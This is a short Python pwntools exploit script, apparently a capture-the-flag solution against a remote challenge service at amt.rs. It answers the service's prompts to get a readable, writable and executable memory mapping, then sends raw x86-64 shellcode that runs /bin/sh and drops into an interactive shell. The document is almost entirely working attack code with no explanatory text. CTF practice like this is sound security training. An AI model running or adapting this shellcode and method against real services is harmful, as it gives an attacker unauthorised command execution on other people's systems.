from pwn import *

io = remote('amt.rs', 31172)
#gdb.attach(io, api=True)

#Address
io.recvuntil(b'> ')
io.sendline(b'0')
#Len
io.recvuntil(b'> ')
io.sendline(b'4096')
#Fd
io.recvuntil(b'> ')
io.sendline(b'3')
#Flag
io.recvuntil(b'> ')
io.sendline(b'0')
#Offset
io.recvuntil(b'> ')
io.sendline(b'0')
#Prot
io.recvuntil(b'> ')
io.sendline(b'7')

time.sleep(0.2)
payload = b"\x48\x31\xC0\x48\x83\xC0\x3B\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x8D\x3C\x24\x48\x31\xF6\x48\x31\xD2\x0F\x05"
io.sendline(payload)

io.recvuntil(b'> ')
io.sendline(b'0')

io.interactive()